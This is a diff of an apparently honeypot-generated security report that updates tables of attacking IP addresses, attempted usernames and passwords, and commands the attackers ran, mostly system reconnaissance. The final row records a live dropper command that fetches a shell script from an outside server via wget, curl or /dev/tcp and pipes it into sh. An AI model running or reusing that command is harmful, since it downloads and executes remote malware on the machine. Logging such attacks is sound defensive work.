@@ -13,67 +13,51 @@ system. The table is sorted by the number of attempts.
 
 | Client IP | Count    |
 |-----------|----------|
-| 8.218.45.134 | 4873 |
-| 8.218.186.25 | 4277 |
-| 8.209.253.56 | 4172 |
-| 60.205.179.11 | 4047 |
-| 137.184.230.16 | 1732 |
-| 109.123.254.15 | 1724 |
-| 47.254.251.235 | 1279 |
-| 128.199.45.85 | 849 |
-| 146.190.149.148 | 796 |
-| 167.172.174.75 | 737 |
+| 109.123.254.15 | 6823 |
+| 8.209.253.56 | 4156 |
+| 8.216.122.147 | 4097 |
+| 149.129.249.160 | 1741 |
+| 167.99.186.137 | 1295 |
+| 8.217.180.105 | 878 |
+| 159.203.2.86 | 791 |
+| 146.190.21.251 | 773 |
+| 206.189.120.23 | 701 |
+| 167.71.143.241 | 685 |
 
 ### Top 10 malicious try to login as
 
 | Usernames | Count    |
 |-----------|----------|
-| root | 1476 |
-| oracle | 98 |
-| admin | 85 |
-| ubuntu | 82 |
-| user | 61 |
-| git | 52 |
-| test | 48 |
-| validator | 47 |
-| node | 43 |
-| postgres | 37 |
+| root | 2590 |
+| oracle | 83 |
+| admin | 70 |
+| deploy | 69 |
+| postgres | 65 |
+| user | 60 |
+| deployer | 55 |
+| mysql | 53 |
+| hadoop | 52 |
+| git | 50 |
 
 ### Top 10 malicious try to authenticate with
 
 | Password | Count    |
 |-----------|----------|
-| 123456 | 388 |
-| 12345678 | 97 |
+| 123456 | 508 |
+| 111111 | 126 |
+| 123 | 90 |
 | password | 83 |
-| 111111 | 72 |
-| 1234 | 58 |
-| 123 | 51 |
-| validator | 40 |
-| root | 38 |
-| admin | 32 |
-| node | 31 |
+| 12345678 | 78 |
+| danniel12 | 77 |
+| daniel12 | 77 |
+| 1234 | 62 |
+| 12345 | 47 |
+| 1 | 34 |
 
 ### Top malicious commands try to execute
 
 | Client | Command |
 |--------|---------|
-| 137.184.230.16 | uname -s -v -n -r -m |
-| 137.184.230.16 | uptime -p |
-| 137.184.230.16 | lspci \| grep VGA \| cut -f5- -d ' ' |
-| 137.184.230.16 | lspci \| grep VGA -c |
-| 137.184.230.16 | nvidia-smi -q \| grep "Product Name" \| head -n 1 \| awk '{print $4, $5, $6, $7, $8, $9, $10, $11}' |
-| 137.184.230.16 | lspci \| grep "3D controller" \| cut -f5- -d ' ' |
-| 137.184.230.16 | nvidia-smi -q \| grep "Product Name" \| awk '{print $4, $5, $6, $7, $8, $9, $10, $11}' \| grep . -c |
-| 137.184.230.16 | ip r \| grep -Eo '[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}/[0-9]{1,2}' |
-| 221.12.146.131 | uname -s -m |
-| 120.26.168.134 | uname -s -m |
-| 137.184.230.16 | uname -s -v -n -r -m |
-| 137.184.230.16 | uptime -p |
-| 137.184.230.16 | lspci \| grep VGA \| cut -f5- -d ' ' |
-| 137.184.230.16 | lspci \| grep VGA -c |
-| 137.184.230.16 | nvidia-smi -q \| grep "Product Name" \| head -n 1 \| awk '{print $4, $5, $6, $7, $8, $9, $10, $11}' |
-| 137.184.230.16 | lspci \| grep "3D controller" \| cut -f5- -d ' ' |
-| 137.184.230.16 | nvidia-smi -q \| grep "Product Name" \| awk '{print $4, $5, $6, $7, $8, $9, $10, $11}' \| grep . -c |
-| 137.184.230.16 | ip r \| grep -Eo '[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}/[0-9]{1,2}' |
+| 182.92.151.31 | uname -s -m |
+| 182.92.210.172 | uname -s -m |
 | 94.103.125.37 | uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; SC=$(wget -O- http://94.156.177.109/sh \|\| curl http://94.156.177.109/sh); if [ $? -ne 0 ]; then exec 3<>"/dev/tcp/94.156.177.109/80"; echo -e "GET /sh HTTP/1.0\r\nHost: 94.156.177.109\r\n\r\n" >&3; (while read -r line; do [ "$line" = $'\r' ] && break; done && cat) <&3 \| sh -s ssh; exec 3>&-; else echo "$SC" \| sh -s ssh; fi |
